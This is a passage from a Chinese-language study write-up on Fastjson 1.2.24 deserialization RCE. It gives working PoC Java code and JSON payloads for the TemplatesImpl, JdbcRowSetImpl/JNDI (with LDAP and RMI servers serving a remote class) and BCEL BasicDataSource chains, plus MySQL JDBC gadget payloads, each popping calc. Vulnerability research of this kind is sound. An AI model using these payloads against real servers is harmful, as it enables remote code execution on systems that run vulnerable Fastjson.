       "@type":"java.lang.AutoCloseable",
       "@type":"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
       "proxy": {
              "connectionString":{
                     "url":"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc"
              }
       }
}

8.0.19(反序列化链)，8.0.19+(SSRF)
{
       "@type":"java.lang.AutoCloseable",
       "@type":"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
       "proxy": {
              "@type":"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
              "connectionUrl":{
                     "@type":"com.mysql.cj.conf.url.ReplicationConnectionUrl",
                     "masters":[{
                            "host":""
                     }],
                     "slaves":[],
                     "properties":{
                            "host":"127.0.0.1",
                            "user":"yso_CommonsCollections4_calc",
                            "dbname":"dbname",
                            "password":"pass",
                            "queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                            "autoDeserialize":"true"
                     }
              }
       }
}
```

---

![image.png](https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png)

> **以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接**

# 0x02 调试分析

    Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。 fastjson在阿里巴巴大规模使用，在数万台服务器上部署，Fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。出现安全问题影响范围很广。

采用一种“假定有序快速匹配”的算法，是号称Java中最快的json库

## 环境搭建

idea中新建maven项目，在pom.xml中添加以下代码即可

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>fastjsonVulTest</artifactId>
    <version>1.0-SNAPSHOT</version>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>8</source>
                    <target>8</target>
                </configuration>
            </plugin>
        </plugins>
    </build>
    <dependencies>
        <!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-compress</artifactId>
            <version>1.0</version>
        </dependency>
        <dependency>
            <groupId>commons-codec</groupId>
            <artifactId>commons-codec</artifactId>
            <version>1.6</version>
        </dependency>
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>1.4</version>
        </dependency>
        <dependency>
            <groupId>com.unboundid</groupId>
            <artifactId>unboundid-ldapsdk</artifactId>
            <version>4.0.9</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.tomcat</groupId>
            <artifactId>tomcat-dbcp</artifactId>
            <version>9.0.8</version>
        </dependency>
    </dependencies>
</project>
```

# 0x03 FastJSON基础

- 当反序列化为JSON.parseObject(*)形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；
- 当反序列化为JSON.parseObject(*,*.class)形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；
- 当反序列化为JSON.parseObject(*)形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即JSON.parseObject(*,*.class)形式得到的都是特定的Student类；
- 如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。

## 基于TemplateImpl的利用链

### 依赖

**Java字节码的执行，需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。**  ****

### POC

**Test.java**

```java
package com;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```

**PoC.java**

```java
package com;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.compress.utils.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class PoC {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }

    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
            final String evilClassPath = System.getProperty("user.dir") + "\\src\\main\\java\\com\\Impl\\Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                    "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

PoC中几个重要的Json键的含义：

- **@type**——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField；
- _bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；
- _outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；
- _tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；

### 分析

当解析到_outputProperties的内容时，看到前面的下划线被去掉了：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225500-6f241022-7139-4b84-b28a-b46b1de6a0d4.png#align=left&display=inline&height=529&margin=%5Bobject%20Object%5D&originHeight=529&originWidth=982&size=0&status=done&style=none&width=982](https://s2.loli.net/2022/02/18/L9cK7BigVvE2exd.png)

跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()

方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225748-54f1f68a-2853-47c4-8739-bc4b326b6d72.png#align=left&display=inline&height=382&margin=%5Bobject%20Object%5D&originHeight=382&originWidth=1279&size=0&status=done&style=none&width=1279](https://s2.loli.net/2022/02/18/sUyXqmBbNEGtJwH.png)

跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=276&originWidth=621&size=0&status=done&style=none&width=621](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225678-a748548c-16af-4384-8393-160288a0369a.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=276&originWidth=621&size=0&status=done&style=none&width=621)

跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=990&size=0&status=done&style=none&width=990](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225755-a5b3ae8b-fcb5-4d97-aa60-2f17e7ec100f.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=990&size=0&status=done&style=none&width=990)

继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&display=inline&height=554&margin=%5Bobject%20Object%5D&originHeight=554&originWidth=978&size=0&status=done&style=none&width=978](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496225983-6ed5b415-094d-4c6b-ae47-0c8832fe0bb3.png#align=left&display=inline&height=554&margin=%5Bobject%20Object%5D&originHeight=554&originWidth=978&size=0&status=done&style=none&width=978)

再往下就是新建Test类实例的过程，并调用Test类的构造函数：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&originHeight=372&originWidth=614&size=0&status=done&style=none&width=614](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496229820-fb5da03f-a565-4777-9379-32b685c90a78.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&originHeight=372&originWidth=614&size=0&status=done&style=none&width=614)

再之后就是弹计算器了。

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&display=inline&height=551&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1102&originWidth=1181&size=193415&status=done&style=none&width=590.5](https://cdn.nlark.com/yuque/0/2020/png/244880/1605235152317-79708490-c7da-4b54-bd4e-1820ccb76cbd.png#align=left&display=inline&height=551&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1102&originWidth=1181&size=193415&status=done&style=none&width=590.5)

## 基于JdbcRowSetImpl的利用链

### 依赖

**基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191。** **并且实际利用中需要连接远程恶意服务器，在目标没外网的情况下无法直接利用；**

### POC

**Exploit.java**

注：编译exploit.class中不能有包名

```java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.io.Serializable;
import java.util.Hashtable;

public class Exploit implements ObjectFactory, Serializable {
    /**
     * 要注册的Exploit
     */
    public Exploit() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }

    public static void main(String[] args) {
        Exploit exploit = new Exploit();
    }
}
```

**ldap**

```java
package com.JNDI;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Exploit";
        int port = 1389;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

**RMI**

```java
package com.JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(11099);
        System.out.println("Java RMI registry created. port on 11099");
        Reference reference = new Reference("Exploit", "Exploit", "http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }
}
```

poc.java

```java
package com.JNDI;

import com.alibaba.fastjson.JSON;
public class Poc {
    public static void main(String[] argv){
        String PoC = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true}";
        JSON.parse(PoC);
    }
}
```

### 分析

先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&display=inline&height=378&margin=%5Bobject%20Object%5D&originHeight=378&originWidth=1026&size=0&status=done&style=none&width=1026](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132716-7c72b771-9d00-4e81-b3d1-609fd39d2bd9.png#align=left&display=inline&height=378&margin=%5Bobject%20Object%5D&originHeight=378&originWidth=1026&size=0&status=done&style=none&width=1026)

接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&display=inline&height=445&margin=%5Bobject%20Object%5D&originHeight=445&originWidth=771&size=0&status=done&style=none&width=771](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496130846-26c493a2-7cee-4964-a39e-48a37b6452fa.png#align=left&display=inline&height=445&margin=%5Bobject%20Object%5D&originHeight=445&originWidth=771&size=0&status=done&style=none&width=771)

跟进connect()函数，看到了熟悉的JNDI注入的代码即InitialContext.lookup()，并且其参数是调用this.getDataSourceName()

获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：

<img src="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132370-9e40a3b3-638d-4e70-a8f2-393c51a974dc.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=1089&size=0&status=done&style=none&width=1089" alt="https://cdn.nlark.com/yuque/0/2020/png/244880/1605496132370-9e40a3b3-638d-4e70-a8f2-393c51a974dc.png#align=left&display=inline&height=442&margin=%5Bobject%20Object%5D&originHeight=442&originWidth=1089&size=0&status=done&style=none&width=1089"  />

再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。

## 基于BasicDataSource的利用链

### 依赖

BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。 比如：6.0.53、7.0.81等版本。MVN 依赖写法如下：

```xml
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp -->
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>dbcp</artifactId>
    <version>6.0.53</version>
</dependency>
```

在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。 MVN依赖写法如下：

```xml
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp -->
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-dbcp</artifactId>
    <version>9.0.8</version>
</dependency>
```

或者直接去[https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp](https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp)下载对应jar包导入项目复现

### POC：

**evil**

```java
package com;

import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**poc**

```java
package com;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class evilPoc {
    public static void main(String [] args) throws Exception{
        JavaClass cls = Repository.lookupClass(Evil.class);
        String code = Utility.encode(cls.getBytes(),true);
        System.out.println(code);
       // new ClassLoader().loadClass("$$BCEL$$" + code).newInstance();
        String poc = "{\n" +
                "    {\n" +
                "        \"x\":{\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+code+"\"\n" +
                "        }\n" +
                "    }: \"x\"\n" +
                "}";
        System.out.println(poc);
        JSON.parseObject(poc);

    }
}
```

### 分析

BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是通过getConnection()->createDataSource()->createConnectionFactory()的调用关系，调用到了createConnectionFactory方法：

```java
protected ConnectionFactory createConnectionFactory() throws SQLException {
        // Load the JDBC driver class
        Driver driverToUse = this.driver;
        if (driverToUse == null) {
            Class<?> driverFromCCL = null;
            if (driverClassName != null) {
                try {
                    try {
                        if (driverClassLoader == null) {
                            driverFromCCL = Class.forName(driverClassName);
                        } else {
                            driverFromCCL = Class.forName(
                                    driverClassName, true, driverClassLoader);
                        }
                        ...
```

在createConnectionFactory方法中，调用了Class.forName(driverClassName, true, driverClassLoader)

。有读过我的《Java安全漫谈》第一篇文章的同学应该对Class.forName还有印象，第二个参数initial

为true时，类加载后将会直接执行static{}块中的代码。 因为driverClassLoader和driverClassName

都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可，com.sun.org.apache.bcel.internal.util.ClassLoader，这是一个神奇的ClassLoader，因为它会直接从classname中提取Class的bytecode数据。

![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903)

如果 classname 中包含$$BCEL$$，这个 ClassLoader 则会将$$BCEL$$

后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。

于是我们通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。 BCEL编码和解码的方法：

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
...
String s =  Utility.encode(data,true);
byte[] bytes  = Utility.decode(s, true);
...
```

# 0x04 参考

[BCEL ClassLoader去哪了？](https://mp.weixin.qq.com/s/TBSlxuxhdvHZrJVPObiRYQ)

[xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/](http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)

[Java动态类加载，当FastJson遇到内网 – KINGX](https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html)

[Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ]](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

[Fastjson历史补丁Bypass分析 · BlBana’s BlackHouse](https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90)

[depycode/fastjson-local-echo: 基于dbcp的fastjson rce 回显](https://github.com/depycode/fastjson-local-echo)

[share/ppt/BlackHat USA 2021/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf (aliyuncs.com)](https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D)

